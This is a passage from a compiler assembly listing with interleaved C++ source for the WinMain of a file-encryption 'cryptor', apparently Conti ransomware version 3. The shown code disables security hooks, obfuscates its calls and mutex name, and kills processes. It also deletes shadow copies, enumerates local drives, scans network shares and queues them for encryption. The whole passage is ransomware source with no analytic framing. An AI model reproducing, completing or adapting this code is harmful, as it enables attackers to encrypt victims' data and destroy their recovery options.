	00 00		 lea	 rsp, QWORD PTR [rbp+200]
  00032	5f		 pop	 rdi
  00033	5d		 pop	 rbp
  00034	c3		 ret	 0
??2@YAPEAX_KPEAX@Z ENDP					; operator new
_TEXT	ENDS
; Function compile flags: /Odtp /RTCsu /ZI
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\main.cpp
;	COMDAT WinMain
_TEXT	SEGMENT
DriveList$ = 8
CmdLine$ = 56
hMutex$6 = 88
SystemInfo$ = 120
ThreadsCountForPool$ = 200
PidList$ = 232
DriveInfo$7 = 280
$T8 = 696
$T9 = 760
$T10 = 824
$T11 = 856
$T12 = 920
tv141 = 932
__$ArrayPad$ = 936
hInstance$ = 976
hPrevInstance$ = 984
lpCmdLine$ = 992
nShowCmd$ = 1000
WinMain	PROC						; COMDAT

; 202  : {

$LN35:
  00000	44 89 4c 24 20	 mov	 DWORD PTR [rsp+32], r9d
  00005	4c 89 44 24 18	 mov	 QWORD PTR [rsp+24], r8
  0000a	48 89 54 24 10	 mov	 QWORD PTR [rsp+16], rdx
  0000f	48 89 4c 24 08	 mov	 QWORD PTR [rsp+8], rcx
  00014	55		 push	 rbp
  00015	57		 push	 rdi
  00016	48 81 ec d8 03
	00 00		 sub	 rsp, 984		; 000003d8H
  0001d	48 8d 6c 24 20	 lea	 rbp, QWORD PTR [rsp+32]
  00022	48 8d 7c 24 20	 lea	 rdi, QWORD PTR [rsp+32]
  00027	b9 8e 00 00 00	 mov	 ecx, 142		; 0000008eH
  0002c	b8 cc cc cc cc	 mov	 eax, -858993460		; ccccccccH
  00031	f3 ab		 rep stosd
  00033	48 8b 8c 24 f8
	03 00 00	 mov	 rcx, QWORD PTR [rsp+1016]
  0003b	48 8b 05 00 00
	00 00		 mov	 rax, QWORD PTR __security_cookie
  00042	48 33 c5	 xor	 rax, rbp
  00045	48 89 85 a8 03
	00 00		 mov	 QWORD PTR __$ArrayPad$[rbp], rax
  0004c	48 8d 0d 00 00
	00 00		 lea	 rcx, OFFSET FLAT:__18E689E6_main@cpp
  00053	e8 00 00 00 00	 call	 __CheckForDebuggerJustMyCode
$LN4@WinMain:

; 203  : 	filesystem::DRIVE_LIST DriveList;
; 204  : 	TAILQ_INIT(&DriveList);

  00058	48 c7 45 08 00
	00 00 00	 mov	 QWORD PTR DriveList$[rbp], 0
  00060	48 8d 45 08	 lea	 rax, QWORD PTR DriveList$[rbp]
  00064	48 89 45 10	 mov	 QWORD PTR DriveList$[rbp+8], rax
  00068	33 c0		 xor	 eax, eax
  0006a	85 c0		 test	 eax, eax
  0006c	75 ea		 jne	 SHORT $LN4@WinMain

; 205  : 
; 206  : 	morphcode();

  0006e	e8 00 00 00 00	 call	 ?morphcode@@YAXXZ	; morphcode

; 207  : 
; 208  : 	if (!getapi::InitializeGetapiModule()) {

  00073	e8 00 00 00 00	 call	 ?InitializeGetapiModule@getapi@@YAHXZ ; getapi::InitializeGetapiModule
  00078	85 c0		 test	 eax, eax
  0007a	75 0a		 jne	 SHORT $LN11@WinMain

; 209  : 		return EXIT_FAILURE;

  0007c	b8 01 00 00 00	 mov	 eax, 1
  00081	e9 2d 03 00 00	 jmp	 $LN1@WinMain
$LN11@WinMain:

; 210  : 	}
; 211  : 
; 212  : 	morphcode();

  00086	e8 00 00 00 00	 call	 ?morphcode@@YAXXZ	; morphcode

; 213  : 
; 214  : 	DisableHooks();

  0008b	e8 00 00 00 00	 call	 ?DisableHooks@@YAXXZ	; DisableHooks

; 215  : 
; 216  : 	morphcode();

  00090	e8 00 00 00 00	 call	 ?morphcode@@YAXXZ	; morphcode

; 217  : 
; 218  : #ifndef DEBUG
; 219  : 	LPWSTR CmdLine = (LPWSTR)pGetCommandLineW();

  00095	e8 00 00 00 00	 call	 ?pGetCommandLineW@@YAPEA_WXZ ; pGetCommandLineW
  0009a	48 89 45 38	 mov	 QWORD PTR CmdLine$[rbp], rax

; 220  : 	HandleCommandLine((PWSTR)CmdLine);

  0009e	48 8b 4d 38	 mov	 rcx, QWORD PTR CmdLine$[rbp]
  000a2	e8 00 00 00 00	 call	 ?HandleCommandLine@@YAHPEA_W@Z ; HandleCommandLine

; 221  : #else
; 222  : 
; 223  : 	LPWSTR CmdLine = (LPWSTR)L"C:\\1.exe -nomutex -size 20";
; 224  : 
; 225  : 	morphcode(CmdLine);
; 226  : 
; 227  : 	HandleCommandLine((PWSTR)CmdLine);
; 228  : 
; 229  : #endif
; 230  : 
; 231  : 	if (!g_NoMutex) {

  000a7	83 3d 00 00 00
	00 00		 cmp	 DWORD PTR ?g_NoMutex@@3HA, 0 ; g_NoMutex
  000ae	75 47		 jne	 SHORT $LN12@WinMain

; 232  : 
; 233  : 		HANDLE hMutex = pCreateMutexA(NULL, TRUE, OBFA("hsfjuukjzloqu28oajh727190"));

  000b0	48 8d 15 00 00
	00 00		 lea	 rdx, OFFSET FLAT:??_C@_0BK@DGNDOENM@hsfjuukjzloqu28oajh727190@
  000b7	48 8d 8d b8 02
	00 00		 lea	 rcx, QWORD PTR $T8[rbp]
  000be	e8 00 00 00 00	 call	 ??0?$MetaBuffer@$0GB@$0BD@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@@std@@@@QEAA@PEBE@Z ; MetaBuffer<97,19,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25> >::MetaBuffer<97,19,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25> >
  000c3	48 8b c8	 mov	 rcx, rax
  000c6	e8 00 00 00 00	 call	 ?decrypt@?$MetaBuffer@$0GB@$0BD@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@@std@@@@QEAAPEBDXZ ; MetaBuffer<97,19,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25> >::decrypt
  000cb	4c 8b c0	 mov	 r8, rax
  000ce	ba 01 00 00 00	 mov	 edx, 1
  000d3	33 c9		 xor	 ecx, ecx
  000d5	e8 00 00 00 00	 call	 ?pCreateMutexA@@YAPEAXPEAU_SECURITY_ATTRIBUTES@@HPEBD@Z ; pCreateMutexA
  000da	48 89 45 58	 mov	 QWORD PTR hMutex$6[rbp], rax

; 234  : 		if (pWaitForSingleObject(hMutex, 0) != WAIT_OBJECT_0) {

  000de	33 d2		 xor	 edx, edx
  000e0	48 8b 4d 58	 mov	 rcx, QWORD PTR hMutex$6[rbp]
  000e4	e8 00 00 00 00	 call	 ?pWaitForSingleObject@@YAKPEAXK@Z ; pWaitForSingleObject
  000e9	85 c0		 test	 eax, eax
  000eb	74 0a		 je	 SHORT $LN12@WinMain

; 235  : 			return EXIT_FAILURE;

  000ed	b8 01 00 00 00	 mov	 eax, 1
  000f2	e9 bc 02 00 00	 jmp	 $LN1@WinMain
$LN12@WinMain:

; 236  : 		}
; 237  : 
; 238  : 	}
; 239  : 
; 240  : 	if (global::GetEncryptMode() == PATH_ENCRYPT) {

  000f7	e8 00 00 00 00	 call	 ?GetEncryptMode@global@@YAHXZ ; global::GetEncryptMode
  000fc	83 f8 0e	 cmp	 eax, 14
  000ff	75 68		 jne	 SHORT $LN14@WinMain

; 241  : 
; 242  : 		if (!threadpool::Create(threadpool::LOCAL_THREADPOOL, 1)) {

  00101	ba 01 00 00 00	 mov	 edx, 1
  00106	33 c9		 xor	 ecx, ecx
  00108	e8 00 00 00 00	 call	 ?Create@threadpool@@YAHH_K@Z ; threadpool::Create
  0010d	85 c0		 test	 eax, eax
  0010f	75 0a		 jne	 SHORT $LN15@WinMain

; 243  : 			return EXIT_FAILURE;

  00111	b8 01 00 00 00	 mov	 eax, 1
  00116	e9 98 02 00 00	 jmp	 $LN1@WinMain
$LN15@WinMain:

; 244  : 		}
; 245  : 
; 246  : 		if (!threadpool::Start(threadpool::LOCAL_THREADPOOL)) {

  0011b	33 c9		 xor	 ecx, ecx
  0011d	e8 00 00 00 00	 call	 ?Start@threadpool@@YAHH@Z ; threadpool::Start
  00122	85 c0		 test	 eax, eax
  00124	75 0a		 jne	 SHORT $LN16@WinMain

; 247  : 			return EXIT_FAILURE;

  00126	b8 01 00 00 00	 mov	 eax, 1
  0012b	e9 83 02 00 00	 jmp	 $LN1@WinMain
$LN16@WinMain:

; 248  : 		}
; 249  : 
; 250  : 
; 251  : 		threadpool::PutTask(threadpool::LOCAL_THREADPOOL, g_Path);

  00130	48 8d 85 f8 02
	00 00		 lea	 rax, QWORD PTR $T9[rbp]
  00137	48 89 85 38 03
	00 00		 mov	 QWORD PTR $T10[rbp], rax
  0013e	48 8d 15 00 00
	00 00		 lea	 rdx, OFFSET FLAT:?g_Path@@3V?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@A ; g_Path
  00145	48 8b 8d 38 03
	00 00		 mov	 rcx, QWORD PTR $T10[rbp]
  0014c	e8 00 00 00 00	 call	 ??0?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QEAA@AEBV01@@Z ; std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >
  00151	48 8b d0	 mov	 rdx, rax
  00154	33 c9		 xor	 ecx, ecx
  00156	e8 00 00 00 00	 call	 ?PutTask@threadpool@@YAHHV?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@@Z ; threadpool::PutTask

; 252  : 		threadpool::Wait(threadpool::LOCAL_THREADPOOL);

  0015b	33 c9		 xor	 ecx, ecx
  0015d	e8 00 00 00 00	 call	 ?Wait@threadpool@@YAXH@Z ; threadpool::Wait

; 253  : 		return EXIT_SUCCESS;

  00162	33 c0		 xor	 eax, eax
  00164	e9 4a 02 00 00	 jmp	 $LN1@WinMain
$LN14@WinMain:

; 254  : 
; 255  : 	}
; 256  : 
; 257  : 	SYSTEM_INFO SystemInfo;
; 258  : 	pGetNativeSystemInfo(&SystemInfo);

  00169	48 8d 4d 78	 lea	 rcx, QWORD PTR SystemInfo$[rbp]
  0016d	e8 00 00 00 00	 call	 ?pGetNativeSystemInfo@@YAXPEAU_SYSTEM_INFO@@@Z ; pGetNativeSystemInfo

; 259  : 
; 260  : 	morphcode(SystemInfo.wProcessorArchitecture);

  00172	0f b7 45 78	 movzx	 eax, WORD PTR SystemInfo$[rbp]
  00176	8b c8		 mov	 ecx, eax
  00178	e8 00 00 00 00	 call	 ?morphcode@@YAXH@Z	; morphcode

; 261  : 
; 262  : 	SIZE_T ThreadsCountForPool = global::GetEncryptMode() == ALL_ENCRYPT ? SystemInfo.dwNumberOfProcessors : SystemInfo.dwNumberOfProcessors * 2;

  0017d	e8 00 00 00 00	 call	 ?GetEncryptMode@global@@YAHXZ ; global::GetEncryptMode
  00182	83 f8 0a	 cmp	 eax, 10
  00185	75 0e		 jne	 SHORT $LN33@WinMain
  00187	8b 85 98 00 00
	00		 mov	 eax, DWORD PTR SystemInfo$[rbp+32]
  0018d	89 85 a4 03 00
	00		 mov	 DWORD PTR tv141[rbp], eax
  00193	eb 0e		 jmp	 SHORT $LN34@WinMain
$LN33@WinMain:
  00195	8b 85 98 00 00
	00		 mov	 eax, DWORD PTR SystemInfo$[rbp+32]
  0019b	d1 e0		 shl	 eax, 1
  0019d	89 85 a4 03 00
	00		 mov	 DWORD PTR tv141[rbp], eax
$LN34@WinMain:
  001a3	8b 85 a4 03 00
	00		 mov	 eax, DWORD PTR tv141[rbp]
  001a9	48 89 85 c8 00
	00 00		 mov	 QWORD PTR ThreadsCountForPool$[rbp], rax

; 263  : 
; 264  : 	morphcode(ThreadsCountForPool);

  001b0	8b 8d c8 00 00
	00		 mov	 ecx, DWORD PTR ThreadsCountForPool$[rbp]
  001b6	e8 00 00 00 00	 call	 ?morphcode@@YAXH@Z	; morphcode

; 265  : 
; 266  : 	if (global::GetEncryptMode() == ALL_ENCRYPT || global::GetEncryptMode() == LOCAL_ENCRYPT) {

  001bb	e8 00 00 00 00	 call	 ?GetEncryptMode@global@@YAHXZ ; global::GetEncryptMode
  001c0	83 f8 0a	 cmp	 eax, 10
  001c3	74 0a		 je	 SHORT $LN18@WinMain
  001c5	e8 00 00 00 00	 call	 ?GetEncryptMode@global@@YAHXZ ; global::GetEncryptMode
  001ca	83 f8 0b	 cmp	 eax, 11
  001cd	75 47		 jne	 SHORT $LN17@WinMain
$LN18@WinMain:

; 267  : 
; 268  : 		if (!threadpool::Create(threadpool::LOCAL_THREADPOOL, ThreadsCountForPool)) {

  001cf	48 8b 95 c8 00
	00 00		 mov	 rdx, QWORD PTR ThreadsCountForPool$[rbp]
  001d6	33 c9		 xor	 ecx, ecx
  001d8	e8 00 00 00 00	 call	 ?Create@threadpool@@YAHH_K@Z ; threadpool::Create
  001dd	85 c0		 test	 eax, eax
  001df	75 0a		 jne	 SHORT $LN19@WinMain

; 269  : 			return EXIT_FAILURE;

  001e1	b8 01 00 00 00	 mov	 eax, 1
  001e6	e9 c8 01 00 00	 jmp	 $LN1@WinMain
$LN19@WinMain:

; 270  : 		}
; 271  : 
; 272  : 		morphcode(ThreadsCountForPool);

  001eb	8b 8d c8 00 00
	00		 mov	 ecx, DWORD PTR ThreadsCountForPool$[rbp]
  001f1	e8 00 00 00 00	 call	 ?morphcode@@YAXH@Z	; morphcode

; 273  : 
; 274  : 		if (!threadpool::Start(threadpool::LOCAL_THREADPOOL)) {

  001f6	33 c9		 xor	 ecx, ecx
  001f8	e8 00 00 00 00	 call	 ?Start@threadpool@@YAHH@Z ; threadpool::Start
  001fd	85 c0		 test	 eax, eax
  001ff	75 0a		 jne	 SHORT $LN20@WinMain

; 275  : 			return EXIT_FAILURE;

  00201	b8 01 00 00 00	 mov	 eax, 1
  00206	e9 a8 01 00 00	 jmp	 $LN1@WinMain
$LN20@WinMain:

; 276  : 		}
; 277  : 
; 278  : 		morphcode(ThreadsCountForPool);

  0020b	8b 8d c8 00 00
	00		 mov	 ecx, DWORD PTR ThreadsCountForPool$[rbp]
  00211	e8 00 00 00 00	 call	 ?morphcode@@YAXH@Z	; morphcode
$LN17@WinMain:

; 279  : 
; 280  : 	}
; 281  : 
; 282  : 	if (global::GetEncryptMode() == ALL_ENCRYPT || global::GetEncryptMode() == NETWORK_ENCRYPT) {

  00216	e8 00 00 00 00	 call	 ?GetEncryptMode@global@@YAHXZ ; global::GetEncryptMode
  0021b	83 f8 0a	 cmp	 eax, 10
  0021e	74 0a		 je	 SHORT $LN22@WinMain
  00220	e8 00 00 00 00	 call	 ?GetEncryptMode@global@@YAHXZ ; global::GetEncryptMode
  00225	83 f8 0c	 cmp	 eax, 12
  00228	75 4d		 jne	 SHORT $LN7@WinMain
$LN22@WinMain:

; 283  : 
; 284  : 		if (!threadpool::Create(threadpool::NETWORK_THREADPOOL, ThreadsCountForPool)) {

  0022a	48 8b 95 c8 00
	00 00		 mov	 rdx, QWORD PTR ThreadsCountForPool$[rbp]
  00231	b9 01 00 00 00	 mov	 ecx, 1
  00236	e8 00 00 00 00	 call	 ?Create@threadpool@@YAHH_K@Z ; threadpool::Create
  0023b	85 c0		 test	 eax, eax
  0023d	75 0a		 jne	 SHORT $LN23@WinMain

; 285  : 			return EXIT_FAILURE;

  0023f	b8 01 00 00 00	 mov	 eax, 1
  00244	e9 6a 01 00 00	 jmp	 $LN1@WinMain
$LN23@WinMain:

; 286  : 		}
; 287  : 
; 288  : 		morphcode(ThreadsCountForPool);

  00249	8b 8d c8 00 00
	00		 mov	 ecx, DWORD PTR ThreadsCountForPool$[rbp]
  0024f	e8 00 00 00 00	 call	 ?morphcode@@YAXH@Z	; morphcode

; 289  : 
; 290  : 		if (!threadpool::Start(threadpool::NETWORK_THREADPOOL)) {

  00254	b9 01 00 00 00	 mov	 ecx, 1
  00259	e8 00 00 00 00	 call	 ?Start@threadpool@@YAHH@Z ; threadpool::Start
  0025e	85 c0		 test	 eax, eax
  00260	75 0a		 jne	 SHORT $LN24@WinMain

; 291  : 			return EXIT_FAILURE;

  00262	b8 01 00 00 00	 mov	 eax, 1
  00267	e9 47 01 00 00	 jmp	 $LN1@WinMain
$LN24@WinMain:

; 292  : 		}
; 293  : 
; 294  : 		morphcode(ThreadsCountForPool);

  0026c	8b 8d c8 00 00
	00		 mov	 ecx, DWORD PTR ThreadsCountForPool$[rbp]
  00272	e8 00 00 00 00	 call	 ?morphcode@@YAXH@Z	; morphcode
$LN7@WinMain:

; 295  : 
; 296  : 	}
; 297  : 
; 298  : 	process_killer::PID_LIST PidList;
; 299  : 	TAILQ_INIT(&PidList);

  00277	48 c7 85 e8 00
	00 00 00 00 00
	00		 mov	 QWORD PTR PidList$[rbp], 0
  00282	48 8d 85 e8 00
	00 00		 lea	 rax, QWORD PTR PidList$[rbp]
  00289	48 89 85 f0 00
	00 00		 mov	 QWORD PTR PidList$[rbp+8], rax
  00290	33 c0		 xor	 eax, eax
  00292	85 c0		 test	 eax, eax
  00294	75 e1		 jne	 SHORT $LN7@WinMain

; 300  : 	process_killer::GetWhiteListProcess(&PidList);

  00296	48 8d 8d e8 00
	00 00		 lea	 rcx, QWORD PTR PidList$[rbp]
  0029d	e8 00 00 00 00	 call	 ?GetWhiteListProcess@process_killer@@YAXPEAUPID_LIST@1@@Z ; process_killer::GetWhiteListProcess

; 301  : 	cryptor::SetWhiteListProcess(&PidList);

  002a2	48 8d 8d e8 00
	00 00		 lea	 rcx, QWORD PTR PidList$[rbp]
  002a9	e8 00 00 00 00	 call	 ?SetWhiteListProcess@cryptor@@YAXPEAUPID_LIST@process_killer@@@Z ; cryptor::SetWhiteListProcess

; 302  : 	cryptor::DeleteShadowCopies(0);

  002ae	33 c9		 xor	 ecx, ecx
  002b0	e8 00 00 00 00	 call	 ?DeleteShadowCopies@cryptor@@YAFPEAX@Z ; cryptor::DeleteShadowCopies

; 303  : 
; 304  : 	if (global::GetEncryptMode() == ALL_ENCRYPT || global::GetEncryptMode() == LOCAL_ENCRYPT) {

  002b5	e8 00 00 00 00	 call	 ?GetEncryptMode@global@@YAHXZ ; global::GetEncryptMode
  002ba	83 f8 0a	 cmp	 eax, 10
  002bd	74 0e		 je	 SHORT $LN26@WinMain
  002bf	e8 00 00 00 00	 call	 ?GetEncryptMode@global@@YAHXZ ; global::GetEncryptMode
  002c4	83 f8 0b	 cmp	 eax, 11
  002c7	0f 85 a1 00 00
	00		 jne	 $LN25@WinMain
$LN26@WinMain:

; 305  : 
; 306  : 		if (filesystem::EnumirateDrives(&DriveList)) {

  002cd	48 8d 4d 08	 lea	 rcx, QWORD PTR DriveList$[rbp]
  002d1	e8 00 00 00 00	 call	 ?EnumirateDrives@filesystem@@YAHPEAUdrive_list_@1@@Z ; filesystem::EnumirateDrives
  002d6	85 c0		 test	 eax, eax
  002d8	0f 84 90 00 00
	00		 je	 $LN25@WinMain

; 307  : 
; 308  : 			morphcode(DriveList.tqh_first);

  002de	48 8b 4d 08	 mov	 rcx, QWORD PTR DriveList$[rbp]
  002e2	e8 00 00 00 00	 call	 ?morphcode@@YAXPEAX@Z	; morphcode

; 309  : 
; 310  : 			filesystem::PDRIVE_INFO DriveInfo = NULL;

  002e7	48 c7 85 18 01
	00 00 00 00 00
	00		 mov	 QWORD PTR DriveInfo$7[rbp], 0

; 311  : 
; 312  : 			morphcode(DriveInfo);

  002f2	48 8b 8d 18 01
	00 00		 mov	 rcx, QWORD PTR DriveInfo$7[rbp]
  002f9	e8 00 00 00 00	 call	 ?morphcode@@YAXPEAX@Z	; morphcode

; 313  : 
; 314  : 			TAILQ_FOREACH(DriveInfo, &DriveList, Entries) {

  002fe	48 8b 45 08	 mov	 rax, QWORD PTR DriveList$[rbp]
  00302	48 89 85 18 01
	00 00		 mov	 QWORD PTR DriveInfo$7[rbp], rax
  00309	eb 12		 jmp	 SHORT $LN10@WinMain
$LN8@WinMain:
  0030b	48 8b 85 18 01
	00 00		 mov	 rax, QWORD PTR DriveInfo$7[rbp]
  00312	48 8b 40 20	 mov	 rax, QWORD PTR [rax+32]
  00316	48 89 85 18 01
	00 00		 mov	 QWORD PTR DriveInfo$7[rbp], rax
$LN10@WinMain:
  0031d	48 83 bd 18 01
	00 00 00	 cmp	 QWORD PTR DriveInfo$7[rbp], 0
  00325	74 47		 je	 SHORT $LN25@WinMain

; 315  : 
; 316  : 				threadpool::PutTask(threadpool::LOCAL_THREADPOOL, DriveInfo->RootPath);

  00327	48 8d 85 58 03
	00 00		 lea	 rax, QWORD PTR $T11[rbp]
  0032e	48 89 85 98 03
	00 00		 mov	 QWORD PTR $T12[rbp], rax
  00335	48 8b 85 18 01
	00 00		 mov	 rax, QWORD PTR DriveInfo$7[rbp]
  0033c	48 8b d0	 mov	 rdx, rax
  0033f	48 8b 8d 98 03
	00 00		 mov	 rcx, QWORD PTR $T12[rbp]
  00346	e8 00 00 00 00	 call	 ??0?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QEAA@AEBV01@@Z ; std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >
  0034b	48 8b d0	 mov	 rdx, rax
  0034e	33 c9		 xor	 ecx, ecx
  00350	e8 00 00 00 00	 call	 ?PutTask@threadpool@@YAHHV?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@@Z ; threadpool::PutTask

; 317  : 				morphcode((PCHAR)DriveInfo->RootPath.c_str());

  00355	48 8b 85 18 01
	00 00		 mov	 rax, QWORD PTR DriveInfo$7[rbp]
  0035c	48 8b c8	 mov	 rcx, rax
  0035f	e8 00 00 00 00	 call	 ?c_str@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QEBAPEB_WXZ ; std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::c_str
  00364	48 8b c8	 mov	 rcx, rax
  00367	e8 00 00 00 00	 call	 ?morphcode@@YAXPEAX@Z	; morphcode

; 318  : 
; 319  : 			}

  0036c	eb 9d		 jmp	 SHORT $LN8@WinMain
$LN25@WinMain:

; 320  : 
; 321  : 		}
; 322  : 
; 323  : 	}
; 324  : 
; 325  : 	if (global::GetEncryptMode() == ALL_ENCRYPT || global::GetEncryptMode() == NETWORK_ENCRYPT) {

  0036e	e8 00 00 00 00	 call	 ?GetEncryptMode@global@@YAHXZ ; global::GetEncryptMode
  00373	83 f8 0a	 cmp	 eax, 10
  00376	74 0a		 je	 SHORT $LN29@WinMain
  00378	e8 00 00 00 00	 call	 ?GetEncryptMode@global@@YAHXZ ; global::GetEncryptMode
  0037d	83 f8 0c	 cmp	 eax, 12
  00380	75 05		 jne	 SHORT $LN28@WinMain
$LN29@WinMain:

; 326  : 
; 327  : 		network_scanner::StartScan();

  00382	e8 00 00 00 00	 call	 ?StartScan@network_scanner@@YAXXZ ; network_scanner::StartScan
$LN28@WinMain:

; 328  : 
; 329  : 	}
; 330  : 
; 331  : 	if (threadpool::IsActive(threadpool::LOCAL_THREADPOOL)) {

  00387	33 c9		 xor	 ecx, ecx
  00389	e8 00 00 00 00	 call	 ?IsActive@threadpool@@YAHH@Z ; threadpool::IsActive
  0038e	85 c0		 test	 eax, eax
  00390	74 07		 je	 SHORT $LN30@WinMain

; 332  : 		threadpool::Wait(threadpool::LOCAL_THREADPOOL);

  00392	33 c9		 xor	 ecx, ecx
  00394	e8 00 00 00 00	 call	 ?Wait@threadpool@@YAXH@Z ; threadpool::Wait
$LN30@WinMain:

; 333  : 	}	
; 334  : 	if (threadpool::IsActive(threadpool::NETWORK_THREADPOOL)) {

  00399	b9 01 00 00 00	 mov	 ecx, 1
  0039e	e8 00 00 00 00	 call	 ?IsActive@threadpool@@YAHH@Z ; threadpool::IsActive
  003a3	85 c0		 test	 eax, eax
  003a5	74 0a		 je	 SHORT $LN31@WinMain

; 335  : 		threadpool::Wait(threadpool::NETWORK_THREADPOOL);

  003a7	b9 01 00 00 00	 mov	 ecx, 1
  003ac	e8 00 00 00 00	 call	 ?Wait@threadpool@@YAXH@Z ; threadpool::Wait
$LN31@WinMain:

; 336  : 	}
; 337  : 	return EXIT_SUCCESS;

  003b1	33 c0		 xor	 eax, eax
$LN1@WinMain:

; 338  : }

  003b3	48 8b f8	 mov	 rdi, rax
  003b6	48 8d 4d e0	 lea	 rcx, QWORD PTR [rbp-32]
  003ba	48 8d 15 00 00
	00 00		 lea	 rdx, OFFSET FLAT:WinMain$rtcFrameData
  003c1	e8 00 00 00 00	 call	 _RTC_CheckStackVars
  003c6	48 8b c7	 mov	 rax, rdi
  003c9	48 8b 8d a8 03
	00 00		 mov	 rcx, QWORD PTR __$ArrayPad$[rbp]
  003d0	48 33 cd	 xor	 rcx, rbp
  003d3	e8 00 00 00 00	 call	 __security_check_cookie
  003d8	48 8d a5 b8 03
	00 00		 lea	 rsp, QWORD PTR [rbp+952]
  003df	5f		 pop	 rdi
  003e0	5d		 pop	 rbp
  003e1	c3		 ret	 0
WinMain	ENDP
_TEXT	ENDS
END
